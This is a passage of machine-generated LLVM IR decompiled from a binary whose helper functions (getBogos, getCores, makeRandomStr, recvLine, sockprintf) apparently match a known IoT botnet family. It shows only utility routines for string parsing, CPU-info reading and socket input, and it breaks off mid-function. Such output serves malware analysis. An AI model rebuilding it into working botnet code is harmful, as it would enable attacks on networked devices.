  %v2_9118 = call i32 @__GI_sigaddset(i32 %v2_9100, i32 2)
  store i32 %v2_9100, i32* @r0, align 4
  %v2_9128 = call i32 @__GI_sigaddset(i32 %v2_9100, i32 3)
  store i32 %v2_9100, i32* @r0, align 4
  %v2_9138 = call i32 @__GI_sigaddset(i32 %v2_9100, i32 1)
  %v2_9140 = ptrtoint i32* %stack_var_-148 to i32
  %v3_914c = bitcast i32* %stack_var_-276 to %_TYPEDEF_sigset_t*
  %v4_914c = call i32 @__GI_sigprocmask(i32 0, %_TYPEDEF_sigset_t* %v3_914c, i32 %v2_9140)
  %v2_916c = ptrtoint i32* %stack_var_-280 to i32
  br label %dec_label_pc_9150

dec_label_pc_9150:                                ; preds = %dec_label_pc_9194, %dec_label_pc_90f8
  %v2_9160 = load i32, i32* @global_var_2a5e8.37, align 4
  %v2_9164 = add i32 %v2_9160, %v3_90cc
  %v1_9168 = inttoptr i32 %v2_9164 to i32*
  %v2_9168 = load i32, i32* %v1_9168, align 4
  %v3_917c = call i32 @__libc_waitpid(i32 %v2_9168, i32 %v2_916c, i32 0)
  %v3_918c = icmp eq i32 %v3_917c, -1
  %v8_918c = icmp eq i32 %v3_917c, -1
  br i1 %v3_918c, label %dec_label_pc_9194, label %dec_label_pc_91a8

dec_label_pc_9194:                                ; preds = %dec_label_pc_9150
  %v0_9194 = call i32 @__errno_location()
  %v1_919c = inttoptr i32 %v0_9194 to i32*
  %v2_919c = load i32, i32* %v1_919c, align 4
  %v7_91a0 = icmp eq i32 %v2_919c, 4
  br i1 %v7_91a0, label %dec_label_pc_9150, label %dec_label_pc_91a8

dec_label_pc_91a8:                                ; preds = %dec_label_pc_9150, %dec_label_pc_9194
  %v3_91b8 = bitcast i32* %stack_var_-148 to %_TYPEDEF_sigset_t*
  %v4_91b8 = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_91b8, i32 0)
  %v3_91c0 = mul i32 %tmp6, 4
  %v2_91cc = load i32, i32* @global_var_2a5e8.37, align 4
  %v2_91d0 = add i32 %v2_91cc, %v3_91c0
  %v2_91d8 = inttoptr i32 %v2_91d0 to i32*
  store i32 0, i32* %v2_91d8, align 4
  br i1 %v8_918c, label %dec_label_pc_9214, label %dec_label_pc_91e8

dec_label_pc_91e8:                                ; preds = %dec_label_pc_91a8
  %v3_91e8 = load i32, i32* %stack_var_-280, align 4
  %v1_91f4 = and i32 %v3_91e8, 65280
  %v3_91f81 = udiv i32 %v1_91f4, 256
  br label %dec_label_pc_9214

dec_label_pc_9214:                                ; preds = %dec_label_pc_91e8, %dec_label_pc_91a8, %entry, %dec_label_pc_90c8
  %storemerge4 = phi i32 [ -1, %dec_label_pc_90c8 ], [ -1, %entry ], [ %v3_91f81, %dec_label_pc_91e8 ], [ -1, %dec_label_pc_91a8 ]
  ret i32 %storemerge4

; uselistorder directives
  uselistorder i32 %v2_9100, { 1, 0, 3, 2, 5, 4, 7, 6 }
  uselistorder i32 %v3_90cc, { 1, 0 }
  uselistorder i32 (i32, i32)* @__GI_sigaddset, { 2, 1, 0 }
  uselistorder i32* @global_var_2a5e8.37, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_9214, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_91a8, { 1, 0 }
}

define i32 @fdgets(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  br label %dec_label_pc_9298

dec_label_pc_9258:                                ; preds = %dec_label_pc_92a8
  store i32 %v2_92b4, i32* @r1, align 4
  store i32 1, i32* @r2, align 4
  %v1_9274 = call i32 @__libc_read(i32 %arg3)
  %v1_9284 = add nuw i32 %storemerge25, 1
  %v7_9290 = icmp eq i32 %v1_9274, 1
  br i1 %v7_9290, label %dec_label_pc_9298, label %dec_label_pc_92c8

dec_label_pc_9298:                                ; preds = %entry, %dec_label_pc_9258
  %storemerge25 = phi i32 [ 0, %entry ], [ %v1_9284, %dec_label_pc_9258 ]
  %v6_92a4 = icmp slt i32 %storemerge25, %arg2
  br i1 %v6_92a4, label %dec_label_pc_92a8, label %dec_label_pc_92c8

dec_label_pc_92a8:                                ; preds = %dec_label_pc_9298
  %v2_92b4 = add i32 %storemerge25, %arg1
  %v1_92b8 = add i32 %v2_92b4, -1
  %v1_92bc = inttoptr i32 %v1_92b8 to i8*
  %v2_92bc = load i8, i8* %v1_92bc, align 1
  %v7_92c0 = icmp eq i8 %v2_92bc, 10
  br i1 %v7_92c0, label %dec_label_pc_92c8, label %dec_label_pc_9258

dec_label_pc_92c8:                                ; preds = %dec_label_pc_92a8, %dec_label_pc_9298, %dec_label_pc_9258
  %stack_var_-24.0.lcssa = phi i32 [ 1, %dec_label_pc_92a8 ], [ 1, %dec_label_pc_9298 ], [ %v1_9274, %dec_label_pc_9258 ]
  %v2_92cc = icmp eq i32 %stack_var_-24.0.lcssa, 0
  %storemerge3 = select i1 %v2_92cc, i32 0, i32 %arg1
  ret i32 %storemerge3

; uselistorder directives
  uselistorder i32 %v2_92b4, { 1, 0 }
  uselistorder i32 %v1_9274, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_9298, { 1, 0 }
}

define i32 @parseHex(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_934c3 = load i8, i8* %arg1, align 1
  %v2_93505 = icmp eq i8 %v2_934c3, 0
  br i1 %v2_93505, label %dec_label_pc_9364, label %dec_label_pc_9358

dec_label_pc_9318:                                ; preds = %dec_label_pc_9358
  %v3_931c = mul i32 %stack_var_-20.06, 16
  %v4_9320 = ptrtoint i8* %v3_933c to i32
  %v2_9324 = load i8, i8* %v3_933c, align 1
  %v3_9324 = zext i8 %v2_9324 to i32
  %v4_9330 = mul nuw nsw i32 %v3_9324, 4
  %v5_9330 = add i32 %v4_9330, ptrtoint (i32* @global_var_1add0.46 to i32)
  %v6_9330 = inttoptr i32 %v5_9330 to i32*
  %v7_9330 = load i32, i32* %v6_9330, align 4
  %v2_9334 = or i32 %v7_9330, %v3_931c
  %v1_9340 = add i32 %v4_9320, 1
  %v5_9344 = inttoptr i32 %v1_9340 to i8*
  %v2_934c = load i8, i8* %v5_9344, align 1
  %v2_9350 = icmp eq i8 %v2_934c, 0
  br i1 %v2_9350, label %dec_label_pc_9364, label %dec_label_pc_9358

dec_label_pc_9358:                                ; preds = %entry, %dec_label_pc_9318
  %v3_933c = phi i8* [ %v5_9344, %dec_label_pc_9318 ], [ %arg1, %entry ]
  %stack_var_-20.06 = phi i32 [ %v2_9334, %dec_label_pc_9318 ], [ 0, %entry ]
  %v1_935c = icmp slt i32 %stack_var_-20.06, 0
  br i1 %v1_935c, label %dec_label_pc_9364, label %dec_label_pc_9318

dec_label_pc_9364:                                ; preds = %dec_label_pc_9318, %dec_label_pc_9358, %entry
  %stack_var_-20.0.lcssa = phi i32 [ 0, %entry ], [ %v2_9334, %dec_label_pc_9318 ], [ %stack_var_-20.06, %dec_label_pc_9358 ]
  ret i32 %stack_var_-20.0.lcssa

; uselistorder directives
  uselistorder i32 %stack_var_-20.06, { 1, 2, 0 }
  uselistorder label %dec_label_pc_9364, { 1, 0, 2 }
  uselistorder label %dec_label_pc_9358, { 1, 0 }
}

define i32 @wildString(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = inttoptr i32 %arg2 to i8*
  %tmp9 = ptrtoint i8* %arg1 to i32
  %stack_var_-4 = alloca i32, align 4
  %v3_937c = load i32, i32* @r4, align 4
  %v6_937c = load i32, i32* @fp, align 4
  store i32 37764, i32* %stack_var_-4, align 4
  %v2_9380 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9380, i32* @fp, align 4
  %v2_9394 = load i8, i8* %arg1, align 1
  %v7_93a0 = icmp eq i8 %v2_9394, 42
  br i1 %v7_93a0, label %dec_label_pc_93d4, label %dec_label_pc_93a8

dec_label_pc_93a8:                                ; preds = %entry
  %v7_93ac = icmp eq i8 %v2_9394, 63
  br i1 %v7_93ac, label %dec_label_pc_9444, label %dec_label_pc_93b4

dec_label_pc_93b4:                                ; preds = %dec_label_pc_93a8
  %v2_93b8 = icmp eq i8 %v2_9394, 0
  br i1 %v2_93b8, label %dec_label_pc_93c4, label %dec_label_pc_949c

dec_label_pc_93c4:                                ; preds = %dec_label_pc_93b4
  %v2_93c8 = load i8, i8* %tmp, align 1
  %v3_93c8 = zext i8 %v2_93c8 to i32
  br label %dec_label_pc_9510

dec_label_pc_93d4:                                ; preds = %entry
  %v1_93d8 = add i32 %tmp9, 1
  %v3_93e4 = inttoptr i32 %v1_93d8 to i8*
  %v4_93e4 = call i32 @wildString(i8* %v3_93e4, i32 %arg2)
  %v2_93ec = icmp eq i32 %v4_93e4, 0
  br i1 %v2_93ec, label %dec_label_pc_9430, label %dec_label_pc_93f4

dec_label_pc_93f4:                                ; preds = %dec_label_pc_93d4
  %v2_93f8 = load i8, i8* %tmp, align 1
  %v2_93fc = icmp eq i8 %v2_93f8, 0
  br i1 %v2_93fc, label %dec_label_pc_9438, label %dec_label_pc_9404

dec_label_pc_9404:                                ; preds = %dec_label_pc_93f4
  %v1_9408 = add i32 %arg2, 1
  %v4_9414 = call i32 @wildString(i8* nonnull %arg1, i32 %v1_9408)
  %v2_941c = icmp eq i32 %v4_9414, 0
  br i1 %v2_941c, label %dec_label_pc_9430, label %dec_label_pc_9438

dec_label_pc_9430:                                ; preds = %dec_label_pc_9404, %dec_label_pc_93d4
  br label %dec_label_pc_9438

dec_label_pc_9438:                                ; preds = %dec_label_pc_93f4, %dec_label_pc_9404, %dec_label_pc_9430
  %storemerge4 = phi i32 [ 0, %dec_label_pc_9430 ], [ 1, %dec_label_pc_9404 ], [ 1, %dec_label_pc_93f4 ]
  br label %dec_label_pc_9510

dec_label_pc_9444:                                ; preds = %dec_label_pc_93a8
  %v2_9448 = load i8, i8* %tmp, align 1
  %v2_944c = icmp eq i8 %v2_9448, 0
  br i1 %v2_944c, label %dec_label_pc_9490, label %dec_label_pc_9454

dec_label_pc_9454:                                ; preds = %dec_label_pc_9444
  %v1_9458 = add i32 %tmp9, 1
  %v1_9460 = add i32 %arg2, 1
  %v2_946c = inttoptr i32 %v1_9458 to i8*
  %v3_946c = call i32 @wildString(i8* %v2_946c, i32 %v1_9460)
  %v2_9474 = icmp ne i32 %v3_946c, 0
  %. = zext i1 %v2_9474 to i32
  br label %dec_label_pc_9490

dec_label_pc_9490:                                ; preds = %dec_label_pc_9454, %dec_label_pc_9444
  %storemerge3 = phi i32 [ 1, %dec_label_pc_9444 ], [ %., %dec_label_pc_9454 ]
  br label %dec_label_pc_9510

dec_label_pc_949c:                                ; preds = %dec_label_pc_93b4
  %v2_94a0 = load i8, i8* %arg1, align 1
  %v3_94a0 = zext i8 %v2_94a0 to i32
  %v1_94a8 = call i32 @__GI_toupper(i32 %v3_94a0)
  store i32 %v1_94a8, i32* @r4, align 4
  %v2_94b4 = load i8, i8* %tmp, align 1
  %v3_94b4 = zext i8 %v2_94b4 to i32
  %v1_94bc = call i32 @__GI_toupper(i32 %v3_94b4)
  %v0_94c4 = load i32, i32* @r4, align 4
  %v9_94c4 = icmp eq i32 %v0_94c4, %v1_94bc
  br i1 %v9_94c4, label %dec_label_pc_94cc, label %dec_label_pc_9508

dec_label_pc_94cc:                                ; preds = %dec_label_pc_949c
  %v1_94d0 = add i32 %tmp9, 1
  %v1_94d8 = add i32 %arg2, 1
  %v2_94e4 = inttoptr i32 %v1_94d0 to i8*
  %v3_94e4 = call i32 @wildString(i8* %v2_94e4, i32 %v1_94d8)
  %v2_94ec = icmp ne i32 %v3_94e4, 0
  %.8 = zext i1 %v2_94ec to i32
  br label %dec_label_pc_9508

dec_label_pc_9508:                                ; preds = %dec_label_pc_94cc, %dec_label_pc_949c
  %storemerge = phi i32 [ 1, %dec_label_pc_949c ], [ %.8, %dec_label_pc_94cc ]
  br label %dec_label_pc_9510

dec_label_pc_9510:                                ; preds = %dec_label_pc_9490, %dec_label_pc_9438, %dec_label_pc_93c4, %dec_label_pc_9508
  %stack_var_-44.0 = phi i32 [ %storemerge4, %dec_label_pc_9438 ], [ %storemerge3, %dec_label_pc_9490 ], [ %v3_93c8, %dec_label_pc_93c4 ], [ %storemerge, %dec_label_pc_9508 ]
  store i32 %v3_937c, i32* @r4, align 4
  store i32 %v6_937c, i32* @fp, align 4
  ret i32 %stack_var_-44.0

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i8* %tmp, { 0, 2, 3, 1 }
  uselistorder i32 %arg2, { 3, 2, 0, 1, 4 }
  uselistorder label %dec_label_pc_9510, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_9438, { 2, 1, 0 }
}

define i32 @getHost(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v1_9540 = call i32 @inet_addr(i32 %arg1)
  store i32 %v1_9540, i32* %arg2, align 4
  %v3_9558 = icmp eq i32 %v1_9540, -1
  %. = zext i1 %v3_9558 to i32
  ret i32 %.

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @uppercase(i8* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-20 = alloca i8*, align 4
  %v0_9594 = load i32, i32* %r0.global-to-local, align 4
  %storemerge2 = inttoptr i32 %v0_9594 to i8*
  store i8* %storemerge2, i8** %stack_var_-20, align 4
  %v2_95cc3 = load i8, i8* %storemerge2, align 1
  %v2_95d05 = icmp eq i8 %v2_95cc3, 0
  br i1 %v2_95d05, label %dec_label_pc_95d8, label %dec_label_pc_959c

dec_label_pc_959c:                                ; preds = %entry, %dec_label_pc_959c
  %v2_95d88 = phi i8* [ %storemerge, %dec_label_pc_959c ], [ %storemerge2, %entry ]
  %v2_95a0 = load i8, i8* %v2_95d88, align 1
  %v3_95a0 = zext i8 %v2_95a0 to i32
  store i32 %v3_95a0, i32* %r0.global-to-local, align 4
  %v1_95a8 = call i32 @__GI_toupper(i32 %v3_95a0)
  store i32 %v1_95a8, i32* %r0.global-to-local, align 4
  %v3_95b4 = load i8*, i8** %stack_var_-20, align 4
  %v1_95b8 = trunc i32 %v1_95a8 to i8
  store i8 %v1_95b8, i8* %v3_95b4, align 1
  %v4_95bc = ptrtoint i8* %v3_95b4 to i32
  %v1_95c0 = add i32 %v4_95bc, 1
  %storemerge = inttoptr i32 %v1_95c0 to i8*
  store i8* %storemerge, i8** %stack_var_-20, align 4
  %v2_95cc = load i8, i8* %storemerge, align 1
  %v2_95d0 = icmp eq i8 %v2_95cc, 0
  br i1 %v2_95d0, label %dec_label_pc_95c8.dec_label_pc_95d8_crit_edge, label %dec_label_pc_959c

dec_label_pc_95c8.dec_label_pc_95d8_crit_edge:    ; preds = %dec_label_pc_959c
  %v13_95d8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_95d8

dec_label_pc_95d8:                                ; preds = %dec_label_pc_95c8.dec_label_pc_95d8_crit_edge, %entry
  %v13_95d8 = phi i32 [ %v13_95d8.pre, %dec_label_pc_95c8.dec_label_pc_95d8_crit_edge ], [ %v0_9594, %entry ]
  ret i32 %v13_95d8

; uselistorder directives
  uselistorder i8* %storemerge, { 1, 2, 0 }
  uselistorder i8** %stack_var_-20, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 4, 2, 0, 1 }
  uselistorder label %dec_label_pc_959c, { 1, 0 }
}

define i32 @getBogos(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-4120 = alloca i32, align 4
  %stack_var_-4112 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_95e0 = load i32, i32* @fp, align 4
  store i32 %v3_95e0, i32* %stack_var_-16, align 4
  %v13_95e0 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %v13_95e0, i32* @r2, align 4
  %v4_9608 = call i32 @__libc_open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1b1d0.48, i32 0, i32 0), i32 0)
  %v2_97cc = ptrtoint i32* %stack_var_-4120 to i32
  %v1_9628 = bitcast i32* %stack_var_-4120 to i8*
  br label %dec_label_pc_97c4

dec_label_pc_9618:                                ; preds = %dec_label_pc_97c4
  %v2_9628 = call i32 @uppercase(i8* %v1_9628)
  %v4_9640 = call i32 @strstr(i32 %v2_97cc, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1b1e0.50, i32 0, i32 0))
  %v9_9658 = icmp eq i32 %v4_9640, %v2_97cc
  br i1 %v9_9658, label %dec_label_pc_9660, label %dec_label_pc_97a8

dec_label_pc_9660:                                ; preds = %dec_label_pc_9618
  %tmp18 = bitcast i32* %stack_var_-4112 to i8*
  br label %dec_label_pc_9684

dec_label_pc_9678:                                ; preds = %dec_label_pc_96a4, %dec_label_pc_9694, %dec_label_pc_9684
  %v1_967c = add i32 %v4_9684, 1
  %v5_9680 = inttoptr i32 %v1_967c to i8*
  br label %dec_label_pc_9684

dec_label_pc_9684:                                ; preds = %dec_label_pc_9660, %dec_label_pc_9678
  %storemerge2 = phi i8* [ %v5_9680, %dec_label_pc_9678 ], [ %tmp18, %dec_label_pc_9660 ]
  %v4_9684 = ptrtoint i8* %storemerge2 to i32
  %v2_9688 = load i8, i8* %storemerge2, align 1
  %v7_968c = icmp eq i8 %v2_9688, 32
  br i1 %v7_968c, label %dec_label_pc_9678, label %dec_label_pc_9694

dec_label_pc_9694:                                ; preds = %dec_label_pc_9684
  %v2_9698 = load i8, i8* %storemerge2, align 1
  %v7_969c = icmp eq i8 %v2_9698, 9
  br i1 %v7_969c, label %dec_label_pc_9678, label %dec_label_pc_96a4

dec_label_pc_96a4:                                ; preds = %dec_label_pc_9694
  %v2_96a8 = load i8, i8* %storemerge2, align 1
  %v7_96ac = icmp eq i8 %v2_96a8, 58
  br i1 %v7_96ac, label %dec_label_pc_9678, label %dec_label_pc_96e0.preheader

dec_label_pc_96e0.preheader:                      ; preds = %dec_label_pc_96a4
  %v2_96f8 = add i32 %v4_9684, -1
  br label %dec_label_pc_96e0

dec_label_pc_96b8:                                ; preds = %dec_label_pc_96e0, %dec_label_pc_970c
  %v3_96c0 = call i32 @strlen(i8* %storemerge2)
  %v1_96d4 = add i32 %v2_96f8, %v3_96c0
  %v3_96dc = inttoptr i32 %v1_96d4 to i8*
  store i8 0, i8* %v3_96dc, align 1
  br label %dec_label_pc_96e0

dec_label_pc_96e0:                                ; preds = %dec_label_pc_96e0.preheader, %dec_label_pc_96b8
  %v3_96e8 = call i32 @strlen(i8* %storemerge2)
  %v1_96fc = add i32 %v3_96e8, %v2_96f8
  %v1_9700 = inttoptr i32 %v1_96fc to i8*
  %v2_9700 = load i8, i8* %v1_9700, align 1
  %v7_9704 = icmp eq i8 %v2_9700, 13
  br i1 %v7_9704, label %dec_label_pc_96b8, label %dec_label_pc_970c

dec_label_pc_970c:                                ; preds = %dec_label_pc_96e0
  %v3_9714 = call i32 @strlen(i8* %storemerge2)
  %v1_9728 = add i32 %v3_9714, %v2_96f8
  %v1_972c = inttoptr i32 %v1_9728 to i8*
  %v2_972c = load i8, i8* %v1_972c, align 1
  %v7_9730 = icmp eq i8 %v2_972c, 10
  br i1 %v7_9730, label %dec_label_pc_96b8, label %dec_label_pc_9738

dec_label_pc_9738:                                ; preds = %dec_label_pc_970c
  %v2_9744 = call i32 @__GI_strchr(i32 %v4_9684, i32 46)
  %v2_974c = icmp eq i32 %v2_9744, 0
  br i1 %v2_974c, label %dec_label_pc_9770, label %dec_label_pc_9754

dec_label_pc_9754:                                ; preds = %dec_label_pc_9738
  %v2_9760 = call i32 @__GI_strchr(i32 %v4_9684, i32 46)
  %v3_976c = inttoptr i32 %v2_9760 to i8*
  store i8 0, i8* %v3_976c, align 1
  br label %dec_label_pc_9770

dec_label_pc_9770:                                ; preds = %dec_label_pc_9738, %dec_label_pc_9754
  %v3_978c = call i32 @strcpy(i32 %arg1, i8* %storemerge2)
  %v1_9794 = call i32 @__libc_close(i32 %v4_9608)
  br label %dec_label_pc_9800

dec_label_pc_97a8:                                ; preds = %dec_label_pc_9618
  store i32 4096, i32* @r2, align 4
  %v3_97c0 = call i32 @__GI_memset(i8* %v1_9628, i32 0)
  br label %dec_label_pc_97c4

dec_label_pc_97c4:                                ; preds = %entry, %dec_label_pc_97a8
  %v4_97dc = call i32 @fdgets(i32 %v2_97cc, i32 4096, i32 %v4_9608, i32 %v2_97cc)
  %v2_97e4 = icmp eq i32 %v4_97dc, 0
  br i1 %v2_97e4, label %dec_label_pc_97ec, label %dec_label_pc_9618

dec_label_pc_97ec:                                ; preds = %dec_label_pc_97c4
  %v1_97f0 = call i32 @__libc_close(i32 %v4_9608)
  br label %dec_label_pc_9800

dec_label_pc_9800:                                ; preds = %dec_label_pc_9770, %dec_label_pc_97ec
  %storemerge4 = phi i32 [ 1, %dec_label_pc_97ec ], [ 0, %dec_label_pc_9770 ]
  ret i32 %storemerge4

; uselistorder directives
  uselistorder i32 %v2_96f8, { 1, 2, 0 }
  uselistorder i8* %storemerge2, { 0, 1, 3, 2, 4, 5, 7, 6 }
  uselistorder i32 %v2_97cc, { 0, 3, 1, 2 }
  uselistorder i32 %v4_9608, { 1, 2, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder label %dec_label_pc_9800, { 1, 0 }
  uselistorder label %dec_label_pc_97c4, { 1, 0 }
  uselistorder label %dec_label_pc_9770, { 1, 0 }
  uselistorder label %dec_label_pc_96e0, { 1, 0 }
  uselistorder label %dec_label_pc_96b8, { 1, 0 }
  uselistorder label %dec_label_pc_9684, { 1, 0 }
}

define i32 @getCores(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-4120 = alloca i32, align 4
  %v2_982c = ptrtoint i32* %stack_var_-4120 to i32
  %v4_9840 = call i32 @__libc_open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1b1d0.48, i32 0, i32 0), i32 0)
  %v1_9860 = bitcast i32* %stack_var_-4120 to i8*
  br label %dec_label_pc_98bc

dec_label_pc_9850:                                ; preds = %dec_label_pc_98bc
  %v2_9860 = call i32 @uppercase(i8* %v1_9860)
  %v4_9878 = call i32 @strstr(i32 %v2_982c, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1b1e0.50, i32 0, i32 0))
  %v9_988c = icmp eq i32 %v4_9878, %v2_982c
  br i1 %v9_988c, label %dec_label_pc_9894, label %dec_label_pc_98a0

dec_label_pc_9894:                                ; preds = %dec_label_pc_9850
  %v1_9898 = add i32 %stack_var_-24.1, 1
  br label %dec_label_pc_98a0

dec_label_pc_98a0:                                ; preds = %dec_label_pc_9850, %dec_label_pc_9894
  %stack_var_-24.0 = phi i32 [ %v1_9898, %dec_label_pc_9894 ], [ %stack_var_-24.1, %dec_label_pc_9850 ]
  store i32 4096, i32* @r2, align 4
  %v3_98b8 = call i32 @__GI_memset(i8* %v1_9860, i32 0)
  br label %dec_label_pc_98bc

dec_label_pc_98bc:                                ; preds = %entry, %dec_label_pc_98a0
  %stack_var_-24.1 = phi i32 [ 0, %entry ], [ %stack_var_-24.0, %dec_label_pc_98a0 ]
  %v4_98d4 = call i32 @fdgets(i32 %v2_982c, i32 4096, i32 %v4_9840, i32 %v2_982c)
  %v2_98dc = icmp eq i32 %v4_98d4, 0
  br i1 %v2_98dc, label %dec_label_pc_98e4, label %dec_label_pc_9850

dec_label_pc_98e4:                                ; preds = %dec_label_pc_98bc
  %v1_98e8 = call i32 @__libc_close(i32 %v4_9840)
  ret i32 %stack_var_-24.1

; uselistorder directives
  uselistorder i32 %stack_var_-24.1, { 0, 2, 1 }
  uselistorder i32 %v2_982c, { 0, 3, 1, 2 }
  uselistorder label %dec_label_pc_98bc, { 1, 0 }
  uselistorder label %dec_label_pc_98a0, { 1, 0 }
}

define i32 @makeRandomStr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_9908 = load i32, i32* @r4, align 4
  %v6_9908 = load i32, i32* @fp, align 4
  %v0_9914 = load i32, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* %stack_var_-32, align 4
  %v5_998017 = icmp sgt i32 %arg2, 0
  br i1 %v5_998017, label %dec_label_pc_9930, label %dec_label_pc_9984

dec_label_pc_9930:                                ; preds = %entry, %dec_label_pc_9930
  %storemerge118 = phi i32 [ %v1_996c, %dec_label_pc_9930 ], [ 0, %entry ]
  %v2_993c = add i32 %storemerge118, %v0_9914
  store i32 %v2_993c, i32* @r4, align 4
  %v0_9940 = call i32 @rand_cmwc()
  %v2_9950 = urem i32 %v0_9940, 26
  store i32 %v2_9950, i32* %r0.global-to-local, align 4
  %v1_995c = add nuw nsw i32 %v2_9950, 65
  %v1_9964 = trunc i32 %v1_995c to i8
  %v2_9964 = load i32, i32* @r4, align 4
  %v3_9964 = inttoptr i32 %v2_9964 to i8*
  store i8 %v1_9964, i8* %v3_9964, align 1
  %v1_996c = add i32 %storemerge118, 1
  %v3_9978.pre = load i32, i32* %stack_var_-32, align 4
  %v5_9980 = icmp slt i32 %v1_996c, %v3_9978.pre
  br i1 %v5_9980, label %dec_label_pc_9930, label %dec_label_pc_9974.dec_label_pc_9984_crit_edge

dec_label_pc_9974.dec_label_pc_9984_crit_edge:    ; preds = %dec_label_pc_9930
  %v12_9988.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9984

dec_label_pc_9984:                                ; preds = %dec_label_pc_9974.dec_label_pc_9984_crit_edge, %entry
  %v12_9988 = phi i32 [ %v12_9988.pre, %dec_label_pc_9974.dec_label_pc_9984_crit_edge ], [ %v0_9914, %entry ]
  store i32 %v3_9908, i32* @r4, align 4
  store i32 %v6_9908, i32* @fp, align 4
  ret i32 %v12_9988

; uselistorder directives
  uselistorder i32 %v1_996c, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_9930, { 1, 0 }
}

define i32 @recvLine(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_99e0.lr.ph:
  %tmp33 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-185 = alloca i8, align 1
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_9990 = load i32, i32* @fp, align 4
  store i32 %v3_9990, i32* %stack_var_-16, align 4
  store i32 39320, i32* %stack_var_-4, align 4
  %v2_9994 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9994, i32* @fp, align 4
  store i32 %arg3, i32* @r2, align 4
  %v4_99b8 = call i32 @__GI_memset(i8* %arg2, i32 0)
  store i32 30, i32* %stack_var_-184, align 4
  %v2_99cc = ptrtoint i32* %stack_var_-176 to i32
  br label %dec_label_pc_99e0

dec_label_pc_99e0:                                ; preds = %dec_label_pc_99e0.lr.ph, %dec_label_pc_99e0
  %storemerge527 = phi i32 [ 0, %dec_label_pc_99e0.lr.ph ], [ %v1_99f4, %dec_label_pc_99e0 ]
  %v5_99ec = mul nuw nsw i32 %storemerge527, 4
  %v6_99ec = add i32 %v5_99ec, %v2_99cc
  %v7_99ec = inttoptr i32 %v6_99ec to i32*
  store i32 0, i32* %v7_99ec, align 4
  %v1_99f4 = add nuw nsw i32 %storemerge527, 1
  %tmp52 = icmp ult i32 %v1_99f4, 32
  br i1 %tmp52, label %dec_label_pc_99e0, label %dec_label_pc_9a08

dec_label_pc_9a08:                                ; preds = %dec_label_pc_99e0
  %v13_9990 = ptrtoint i32* %stack_var_-16 to i32
  %v3_9a0c = udiv i32 %arg1, 32
  %v3_9a18 = mul nuw nsw i32 %v3_9a0c, 4
  %v2_9a20 = add nsw i32 %v3_9a18, -160
  %v2_9a24 = add i32 %v2_9a20, %v13_9990
  %v1_9a28 = inttoptr i32 %v2_9a24 to i32*
  %v2_9a28 = load i32, i32* %v1_9a28, align 4
  %v1_9a30 = urem i32 %arg1, 32
  %v6_9a38 = shl i32 1, %v1_9a30
  %v2_9a3c = or i32 %v2_9a28, %v6_9a38
  store i32 %v2_9a3c, i32* %v1_9a28, align 4
  %v1_9a5c = add i32 %arg1, 1
  %v2_9a68 = ptrtoint i32* %stack_var_-184 to i32
  store i32 0, i32* @r2, align 4
  %v5_9a7c = call i32 @__libc_select(i32 %v1_9a5c, i32 %v2_99cc, i32 0, i32 %v2_99cc, i32 %v2_9a68)
  %v5_9a90 = icmp sgt i32 %v5_9a7c, 0
  br i1 %v5_9a90, label %dec_label_pc_9c24.preheader, label %dec_label_pc_9b90.preheader

dec_label_pc_9b90.preheader:                      ; preds = %dec_label_pc_9a08
  %v7_9b9823 = icmp slt i32 %tmp33, 10
  br i1 %v7_9b9823, label %dec_label_pc_9ad0.lr.ph, label %dec_label_pc_9c24.preheader

dec_label_pc_9ad0.lr.ph:                          ; preds = %dec_label_pc_9b90.preheader, %dec_label_pc_9b84
  %stack_var_-44.024 = phi i32 [ %v1_9b88, %dec_label_pc_9b84 ], [ %tmp33, %dec_label_pc_9b90.preheader ]
  %v2_9a9c = load i32, i32* @global_var_265cc.54, align 4
  %v3_9aa8 = call i32 @sockprintf(i32 %v2_9a9c, i32 ptrtoint ([5 x i8]* @global_var_1b1ec.56 to i32))
  store i32 30, i32* %stack_var_-184, align 4
